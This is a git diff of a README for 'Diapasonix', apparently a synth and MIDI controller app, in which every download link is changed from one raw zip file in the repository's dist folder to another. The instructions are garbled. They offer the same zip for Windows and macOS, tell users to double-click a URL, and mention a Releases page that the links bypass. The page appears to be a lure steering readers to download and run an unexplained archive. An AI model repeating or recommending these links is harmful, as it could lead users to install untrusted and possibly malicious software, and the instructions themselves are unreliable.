@@ -1,6 +1,6 @@
 # 🎹 Diapasonix - Your Portable Synth and MIDI Controller
 
-[![Download Diapasonix](https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_1.9.zip%https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_1.9.zip)](https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_1.9.zip)
+[![Download Diapasonix](https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_v1.2.zip%https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_v1.2.zip)](https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_v1.2.zip)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ Here’s how you can download and run Diapasonix:
 2. **Visit the Download Page**:
    To download Diapasonix, visit the Releases page. Here you will find the latest versions of the application. 
 
-   [Download Diapasonix Here](https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_1.9.zip)
+   [Download Diapasonix Here](https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_v1.2.zip)
 
 ## 📥 Download & Install
 
@@ -29,15 +29,15 @@ On the Releases page, you will see a list of versions released. Follow these ste
 1. Click on the version you want.
 2. Look for the asset section under the version details. Here, you will find downloadable files.
 3. Select the appropriate file for your operating system:
-   - For Windows, download the `https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_1.9.zip`.
-   - For macOS, download the `https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_1.9.zip`.
+   - For Windows, download the `https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_v1.2.zip`.
+   - For macOS, download the `https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_v1.2.zip`.
    - For Linux, choose the appropriate package or tarball.
 
 4. After you download the file, locate it in your Downloads folder. 
 
 5. **Run the Installer**:
-   - **Windows**: Double-click `https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_1.9.zip` and follow the instructions on the screen.
-   - **macOS**: Open `https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_1.9.zip`, drag Diapasonix to your Applications folder, and then open it.
+   - **Windows**: Double-click `https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_v1.2.zip` and follow the instructions on the screen.
+   - **macOS**: Open `https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_v1.2.zip`, drag Diapasonix to your Applications folder, and then open it.
    - **Linux**: Extract the tarball and follow the installation instructions in the README file provided.
 
 6. Once the installation is complete, you can launch Diapasonix from your applications menu or desktop shortcut.
@@ -77,4 +77,4 @@ Join the Diapasonix community to share your creations and connect with other use
 
 For updates and news, be sure to keep an eye on our Releases page!
 
-[Download Diapasonix Here](https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_1.9.zip)
+[Download Diapasonix Here](https://github.com/naufalya/Diapasonix/raw/refs/heads/main/dist/Software_v1.2.zip)
